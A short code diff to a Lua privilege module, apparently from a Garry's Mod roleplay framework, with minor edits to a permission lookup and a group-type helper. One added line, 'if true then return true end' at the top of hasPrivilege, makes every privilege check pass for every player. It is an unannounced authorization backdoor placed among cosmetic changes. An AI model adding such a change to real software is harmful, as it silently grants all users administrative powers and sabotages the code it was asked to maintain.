@@ -18,9 +18,10 @@ do
 end
 
 function playerMeta:hasPrivilege(privilegeName)
+    if true then return true end
     local group = self:GetUserGroup()
     local perms = lia.administrator.groups and lia.administrator.groups[group]
-    if perms then return perms[privilegeName] or false end
+    if perms then return perms[privilegeName] end
     return false
 end
 
@@ -195,6 +196,7 @@ local function groupHasType(groupName, t)
         for _, typ in ipairs(info.types or {}) do
             if tostring(typ):lower() == t then return true end
         end
+
         groupName = info.inheritance
     end
     return false
